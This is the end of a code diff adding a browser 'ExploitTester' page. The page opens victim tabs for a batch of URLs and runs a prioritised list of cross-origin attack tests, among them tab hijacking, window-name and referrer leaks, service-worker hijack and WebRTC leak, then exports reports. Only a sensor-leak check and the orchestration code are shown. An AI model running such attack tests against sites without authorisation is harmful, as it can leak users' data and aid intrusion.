+      if (sensorData) {
+        this.log('Device Sensor Leak', `Sensor data leaked: ${JSON.stringify(sensorData)}`, 'success');
+      } else {
+        this.log('Device Sensor Leak', 'No sensor data detected.', 'fail');
+      }
+    } catch (e) {
+      this.log('Device Sensor Leak', `Sensor access blocked: ${e.message}`, 'fail');
+    }
+  }
+
+  // Generate report
+  generateReport(format) {
+    const report = {
+      urls: this.urls,
+      timestamp: new Date().toISOString(),
+      riskScore: this.riskScore,
+      results: this.results,
+      domSnapshot: this.captureDOMSnapshot()
+    };
+
+    if (format === 'json') {
+      const blob = new Blob([JSON.stringify(report, null, 2)], { type: 'application/json' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `exploit-report-${new Date().toISOString().split('T')[0]}.json`;
+      a.click();
+      URL.revokeObjectURL(url);
+    } else if (format === 'csv') {
+      const csv = ['Test,Status,Details,Severity,CVE,Timestamp'];
+      this.results.forEach(r => {
+        csv.push(`"${r.testName}","${r.type}","${r.msg.replace(/"/g, '""')}","${r.severity}","${r.cve}","${r.timestamp}"`);
+      });
+      const blob = new Blob([csv.join('\n')], { type: 'text/csv' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      a.href = url;
+      a.download = `exploit-report-${new Date().toISOString().split('T')[0]}.csv`;
+      a.click();
+      URL.revokeObjectURL(url);
+    } else if (format === 'pdf') {
+      const doc = new jsPDF();
+      doc.setFont('Courier');
+      doc.text(`Exploit Test Report - ${report.timestamp}`, 10, 10);
+      doc.text(`URLs: ${report.urls.join(', ')}`, 10, 20);
+      doc.text(`Risk Score: ${report.riskScore}`, 10, 30);
+      let y = 40;
+      report.results.forEach(r => {
+        doc.text(`${r.testName}: ${r.msg} (${r.type}, ${r.severity}, CVE: ${r.cve})`, 10, y);
+        y += 10;
+      });
+      doc.save(`exploit-report-${new Date().toISOString().split('T')[0]}.pdf`);
+    }
+  }
+
+  // Copy results to clipboard
+  copyResults() {
+    const text = this.results.map(r => `${r.testName}: ${r.msg} (${r.type}, ${r.severity}, CVE: ${r.cve})`).join('\n');
+    navigator.clipboard.writeText(text).then(() => {
+      alert('Results copied to clipboard!');
+    }).catch(() => {
+      alert('Failed to copy results.');
+    });
+  }
+
+  // Share to X (simulated)
+  shareToX() {
+    const text = `Exploit Test Results: Risk Score ${this.riskScore}\n` +
+                 this.results.map(r => `${r.testName}: ${r.msg} (${r.type}, CVE: ${r.cve})`).join('\n');
+    alert('Simulated sharing to X:\n' + text);
+  }
+
+  // Prioritize tests based on success rates and browser capabilities
+  getPrioritizedTests() {
+    const tests = [
+      { fn: this.testTabHijacking, name: 'Tab Hijacking', supported: true },
+      { fn: this.testWindowNameLeak, name: 'Window Name Leak', supported: true },
+      { fn: this.testLocationSniffing, name: 'Location Sniffing', supported: true },
+      { fn: this.testPostMessage, name: 'PostMessage', supported: true },
+      { fn: this.testDriveByRedirect, name: 'Drive-by Redirect', supported: true },
+      { fn: this.testReferrerSniffing, name: 'Referrer Sniffing', supported: true },
+      { fn: this.testIframeEmbedding, name: 'Iframe Embedding', supported: true },
+      { fn: this.testDocumentTitle, name: 'Document Title', supported: true },
+      { fn: this.testCORP, name: 'CORP Protection', supported: true },
+      { fn: this.testWindowProxy, name: 'Window Proxy', supported: true },
+      { fn: this.testStorageAccess, name: 'Storage Access', supported: !!document.requestStorageAccess },
+      { fn: this.testXFrameOptions, name: 'X-Frame-Options', supported: true },
+      { fn: this.testCORS, name: 'CORS Misconfig', supported: true },
+      { fn: this.testSpeculativeExecution, name: 'Speculative Execution', supported: true },
+      { fn: this.testStateInference, name: 'State Inference', supported: true },
+      { fn: this.testWindowPoisoning, name: 'Window Poisoning', supported: true },
+      { fn: this.testServiceWorkerHijack, name: 'Service Worker Hijack', supported: !!navigator.serviceWorker },
+      { fn: this.testWebRTCLeak, name: 'WebRTC Leak', supported: !!window.RTCPeerConnection },
+      { fn: this.testPixelRatioLeak, name: 'Pixel Ratio Leak', supported: true },
+      { fn: this.testEventListenerSnooping, name: 'Event Listener Snooping', supported: true },
+      { fn: this.testSharedArrayBufferLeak, name: 'SharedArrayBuffer Leak', supported: !!window.SharedArrayBuffer },
+      { fn: this.testFontLoadingTiming, name: 'Font Loading Timing', supported: !!window.FontFace },
+      { fn: this.testWebGPUResourceLeak, name: 'WebGPU Resource Leak', supported: !!navigator.gpu },
+      { fn: this.testHistoryAPIBypass, name: 'History API Bypass', supported: true },
+      { fn: this.testWebAssemblyMemoryLeak, name: 'WebAssembly Memory Leak', supported: !!window.WebAssembly },
+      { fn: this.testScrollBehaviorInference, name: 'Scroll Behavior Inference', supported: true },
+      { fn: this.testDeviceSensorLeak, name: 'Device Sensor Leak', supported: !!window.DeviceMotionEvent }
+    ];
+    return tests
+      .filter(t => t.supported)
+      .sort((a, b) => (this.testSuccessRates[b.name] || 0) - (this.testSuccessRates[a.name] || 0))
+      .map(t => t.fn);
+  }
+
+  // Run all tests for a single URL with exponential backoff
+  async runSingle(url) {
+    this.log('Exploit Tests', `Starting exploit tests for ${url}...`);
+
+    if (!this.validateUrl(url)) {
+      this.log('Exploit Tests', `Invalid URL: ${url}`, 'fail');
+      return;
+    }
+
+    await this.openVictimTab(url);
+    if (!this.victim) return;
+
+    const tests = this.getPrioritizedTests();
+    for (const test of tests) {
+      let attempt = 0;
+      const maxAttempts = 3;
+      let delay = 500;
+      while (attempt < maxAttempts) {
+        try {
+          await test.call(this);
+          break;
+        } catch (e) {
+          attempt++;
+          this.log('Exploit Tests', `Test retry (${attempt}/${maxAttempts}) failed: ${e.message}`, 'warning');
+          if (attempt < maxAttempts) {
+            await new Promise(resolve => setTimeout(resolve, delay));
+            delay *= 2; // Exponential backoff
+          }
+        }
+      }
+    }
+
+    this.simulateMLAnomalyDetection();
+    this.log('Exploit Tests', `Exploit tests complete for ${url}.`);
+  }
+
+  // Run all tests for multiple URLs
+  async run() {
+    this.results = [];
+    this.progress = 0;
+    document.getElementById('progress-fill').style.width = '0%';
+    document.getElementById('results-body').innerHTML = '';
+    this.initChart();
+    this.initHeatmap();
+    this.init3D();
+
+    const input = this.sanitizeInput(document.getElementById('batch-urls').value.trim());
+    this.urls = input.split('\n').map(url => url.trim()).filter(url => url);
+
+    if (this.urls.length === 0) {
+      this.log('Exploit Tests', 'No valid URLs provided.', 'fail');
+      return;
+    }
+
+    for (const url of this.urls) {
+      await this.runSingle(url);
+    }
+  }
+}
+
+// Initialize and run
+const tester = new ExploitTester();
+function runExploits() {
+  tester.run();
+}
+
+function downloadReport(format) {
+  tester.generateReport(format);
+}
+
+function copyResults() {
+  tester.copyResults();
+}
+
+function shareToX() {
+  tester.shareToX();
+}
+
+function recordVideo() {
+  tester.recordVideo();
+}
+
+function verifyOnBlockchain() {
+  tester.verifyOnBlockchain();
+}
+
+// Load previous results from localStorage
+window.onload = () => {
+  const savedResults = localStorage.getItem('exploitResults');
+  if (savedResults) {
+    tester.results = JSON.parse(savedResults);
+    tester.results.forEach(result => tester.updateResultsTable(result));
+    tester.updateChart();
+    tester.updateHeatmap();
+    tester.update3D();
+    tester.calculateRiskScore();
+  }
+};
+</script>
 </body>
 </html>
